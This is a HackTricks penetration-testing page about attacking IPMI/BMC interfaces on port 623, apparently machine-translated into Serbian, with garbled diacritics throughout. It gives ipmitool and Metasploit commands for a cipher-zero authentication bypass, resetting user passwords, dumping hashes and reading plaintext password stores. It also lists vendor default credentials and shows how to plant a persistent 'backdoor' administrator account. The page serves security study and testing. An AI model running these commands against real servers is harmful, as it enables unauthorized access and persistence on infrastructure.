# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


## Basic Information

### **Overview of IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** nudi standardizovan pristup za daljinsko upravljanje i nadgledanje ra캜unarskih sistema, nezavisno od operativnog sistema ili stanja napajanja. Ova tehnologija omogu캖ava sistem administratorima da upravljaju sistemima na daljinu, 캜ak i kada su isklju캜eni ili neodgovaraju, i posebno je korisna za:

- Konfiguracije pre pokretanja OS-a
- Upravljanje isklju캜enjem
- Oporavak od sistemskih gre코aka

IPMI je sposoban da nadgleda temperature, napone, brzine ventilatora i napajanja, uz pru쬬nje informacija o inventaru, pregled hardverskih logova i slanje upozorenja putem SNMP-a. Osnovni zahtevi za njegov rad su izvor napajanja i LAN konekcija.

Od svog uvo캠enja od strane Intela 1998. godine, IPMI je podr쬬n od strane brojnih dobavlja캜a, pobolj코avaju캖i mogu캖nosti daljinskog upravljanja, posebno sa podr코kom verzije 2.0 za serijsku komunikaciju preko LAN-a. Klju캜ne komponente uklju캜uju:

- **Baseboard Management Controller (BMC):** Glavni mikro-kontroler za IPMI operacije.
- **Komunikacione magistrale i interfejsi:** Za internu i eksternu komunikaciju, uklju캜uju캖i ICMB, IPMB i razne interfejse za lokalne i mre쬹e konekcije.
- **IPMI Memorija:** Za 캜uvanje logova i podataka.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Podrazumevani port**: 623/UDP/TCP (Obi캜no je na UDP-u, ali mo쬰 biti i na TCP-u)

## Enumeration

### Discovery
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Mo쬰te **identifikovati** **verziju** koriste캖i:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Ranljivosti

U oblasti IPMI 2.0, zna캜ajna sigurnosna slabost otkrivena je od strane Dana Farmera, izla쬿캖i ranjivost kroz **cipher type 0**. Ova ranjivost, dokumentovana u detalje na [istra쬴vanju Dana Farmera](http://fish2.com/ipmi/cipherzero.html), omogu캖ava neovla코캖en pristup sa bilo kojom lozinkom pod uslovom da je ciljana validna korisni캜ka nalog. Ova slabost je prona캠ena kod razli캜itih BMC-ova proizvo캠a캜a kao 코to su HP, Dell i Supermicro, sugeri코u캖i 코iroko rasprostranjen problem unutar svih IPMI 2.0 implementacija.

### **IPMI Zaobila쬰nje Autentifikacije putem Cipher 0**

Da bi se otkrila ova slabost, mo쬰 se koristiti slede캖i Metasploit pomo캖ni skener:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Eksploatacija ove gre코ke je mogu캖a pomo캖u `ipmitool`, kao 코to je prikazano u nastavku, 코to omogu캖ava listanje i modifikaciju korisni캜kih lozinki:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Autentifikacija Udaljeno Preuzimanje Hash-a Lozinke**

Ova ranjivost omogu캖ava preuzimanje zasoljenih hash-ova lozinki (MD5 i SHA1) za bilo koje postoje캖e korisni캜ko ime. Da biste testirali ovu ranjivost, Metasploit nudi modul:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonymous Authentication**

Podrazumevana konfiguracija u mnogim BMC-ima omogu캖ava "anonimni" pristup, koji se karakteri코e nul korisni캜kim imenom i lozinkom. Ova konfiguracija se mo쬰 iskoristiti za resetovanje lozinki imenovanih korisni캜kih naloga koriste캖i `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Lozinke u 캛istom Tekstu**

Kriti캜na dizajnerska odluka u IPMI 2.0 zahteva skladi코tenje lozinki u 캜istom tekstu unutar BMC-a u svrhe autentifikacije. Skladi코tenje ovih lozinki od strane Supermicro-a na mestima kao 코to su `/nv/PSBlock` ili `/nv/PSStore` postavlja zna캜ajne bezbednosne brige:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Ranljivost**

Uklju캜ivanje UPnP SSDP slu코atelja u Supermicro-ovom IPMI firmveru, posebno na UDP portu 1900, uvodi ozbiljan bezbednosni rizik. Ranljivosti u Intel SDK za UPnP ure캠aje verzije 1.3.1, kako je detaljno opisano u [Rapid7-ovom otkri캖u](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), omogu캖avaju pristup root-u BMC-u:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP nasumi캜no generi코e podrazumevanu lozinku** za svoj **Integrated Lights Out (iLO)** proizvod tokom proizvodnje. Ova praksa se razlikuje od drugih proizvo캠a캜a, koji obi캜no koriste **stati캜ne podrazumevane akreditive**. Sa쬰tak podrazumevanih korisni캜kih imena i lozinki za razli캜ite proizvode je dat u nastavku:

- **HP Integrated Lights Out (iLO)** koristi **fabricki nasumi캜no generisanu 8-znamenkastu string** kao svoju podrazumevanu lozinku, pokazuju캖i vi코i nivo sigurnosti.
- Proizvodi kao 코to su **Dellov iDRAC, IBM-ov IMM** i **Fujitsu-ov Integrated Remote Management Controller** koriste lako poga캠aju캖e lozinke kao 코to su "calvin", "PASSW0RD" (sa nulom) i "admin" redom.
- Sli캜no tome, **Supermicro IPMI (2.0), Oracle/Sun ILOM** i **ASUS iKVM BMC** tako캠e koriste jednostavne podrazumevane akreditive, pri 캜emu "ADMIN", "changeme" i "admin" slu쬰 kao njihove lozinke.


## Accessing the Host via BMC

Administrativni pristup Kontroleru upravljanja mati캜nom plo캜om (BMC) otvara razli캜ite puteve za pristup operativnom sistemu hosta. Jednostavan pristup uklju캜uje iskori코캖avanje KVM funkcionalnosti BMC-a. To se mo쬰 uraditi ili ponovnim pokretanjem hosta u root shell putem GRUB-a (koriste캖i `init=/bin/sh`) ili pokretanjem sa virtuelnog CD-ROM-a postavljenog kao disk za oporavak. Ove metode omogu캖avaju direktnu manipulaciju diskom hosta, uklju캜uju캖i umetanje backdoor-a, ekstrakciju podataka ili bilo koje potrebne radnje za procenu sigurnosti. Me캠utim, ovo zahteva ponovno pokretanje hosta, 코to je zna캜ajan nedostatak. Bez ponovnog pokretanja, pristup aktivnom hostu je slo쬰niji i varira u zavisnosti od konfiguracije hosta. Ako fizi캜ka ili serijska konzola hosta ostane prijavljena, mo쬰 se lako preuzeti putem KVM ili serial-over-LAN (sol) funkcionalnosti BMC-a koriste캖i `ipmitool`. Istra쬴vanje iskori코캖avanja zajedni캜kih hardverskih resursa, kao 코to su i2c magistrala i Super I/O 캜ip, je oblast koja zahteva dalju istragu.

## Introducing Backdoors into BMC from the Host

Nakon kompromitovanja hosta opremljenog BMC-om, **lokalni BMC interfejs se mo쬰 iskoristiti za umetanje backdoor korisni캜kog naloga**, stvaraju캖i trajnu prisutnost na serveru. Ovaj napad zahteva prisustvo **`ipmitool`** na kompromitovanom hostu i aktivaciju podr코ke za BMC drajver. Slede캖e komande ilustruju kako se novi korisni캜ki nalog mo쬰 ubrizgati u BMC koriste캖i lokalni interfejs hosta, 코to zaobilazi potrebu za autentifikacijom. Ova tehnika je primenljiva na 코irok spektar operativnih sistema uklju캜uju캖i Linux, Windows, BSD, pa 캜ak i DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Produbite svoje znanje o **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte iOS i Android bezbednost kroz na코e kurseve koji se mogu pratiti sopstvenim tempom i dobijite sertifikat:

{% embed url="https://academy.8ksec.io/" %}


{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
